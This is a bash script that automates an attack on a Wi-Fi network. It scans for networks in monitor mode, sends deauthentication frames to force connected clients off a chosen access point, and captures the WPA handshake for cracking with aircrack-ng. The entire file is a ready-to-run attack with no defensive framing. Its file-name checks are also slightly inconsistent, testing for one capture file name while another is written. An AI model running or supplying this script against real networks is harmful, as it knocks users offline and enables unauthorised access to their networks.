#!/bin/bash
echo -ne "\e[38;5;82m"
sudo iwconfig wlan0 power off
sudo airmon-ng start wlan0
sudo timeout 10 airodump-ng wlan0 --write scan --output-format csv
selection=$(python3 select_wifi.py "scan-01.csv") || exit 1
read BSSID CHANNEL ESSID <<< "$selection"
sudo rm scan-01.csv
echo "$BSSID"
echo "$CHANNEL"
echo "$ESSID"
sudo timeout 10 airodump-ng --bssid "$BSSID" -c "$CHANNEL" --write "$BSSID" --output-format cap  wlan0 &
sudo aireplay-ng --deauth 10 -a "$BSSID" wlan0 >/dev/null
wait
if aircrack-ng "$BSSID".cap | grep -q "WPA (0" ; then
        rm "$BSSID"-01.cap
	echo "handshake is not captured"
else
        if  aircrack-ng "$BSSID"-01.cap | grep -q "WPA (" ; then
                echo "handshake is captured" 
        else
                rm "$BSSID"-01.cap
		echo "handshake is not captured"	
        fi
fi



